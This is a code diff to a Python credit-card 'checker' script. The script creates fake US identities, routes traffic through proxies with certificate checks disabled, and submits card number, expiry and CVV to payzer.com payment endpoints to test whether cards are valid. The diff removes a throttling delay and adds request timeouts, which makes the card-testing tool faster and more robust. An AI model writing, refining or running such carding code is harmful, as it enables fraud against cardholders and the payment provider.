@@ -208,7 +208,7 @@ def definir_tipo_cartao(card):
     
 def checker(card, month, year, cvv):
     try:
-        time.sleep(3)
+        #time.sleep(3)
 
         url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
         headers = {
@@ -272,7 +272,7 @@ def checker(card, month, year, cvv):
                 'priority': 'u=0, i'
                 }
 
-            response = requests.request("GET", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p)
+            response = requests.request("GET", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p, timeout=60)
             if 'location' in response.headers:
                 loocation = response.headers.get('location')
 
@@ -297,7 +297,7 @@ def checker(card, month, year, cvv):
                 'priority': 'u=0, i'
                 }
 
-            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
+            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p, timeout=100)
             pm = pegarItem(response.text, 'name="nt" value="','"')
             
             
@@ -353,7 +353,7 @@ def checker(card, month, year, cvv):
             'priority': 'u=0, i'
             }
 
-            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p)
+            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p, timeout=100)
             if 'location' in response.headers:
                 loocation = response.headers.get('location')          
                              
@@ -379,7 +379,7 @@ def checker(card, month, year, cvv):
                 'priority': 'u=0, i'
                 }
 
-                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
+                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p, timeout=60)
             
                 url = f"https://www.payzer.com/Payment/ExternalConfirmPayment/nt/{pm}"
 
@@ -405,7 +405,7 @@ def checker(card, month, year, cvv):
                 'priority': 'u=0, i'
                 }
 
-                response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
+                response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p, timeout=60)
                 if 'getSelectedFinancingProduct' in response.text:
                     raise RequisicaoException()
                 
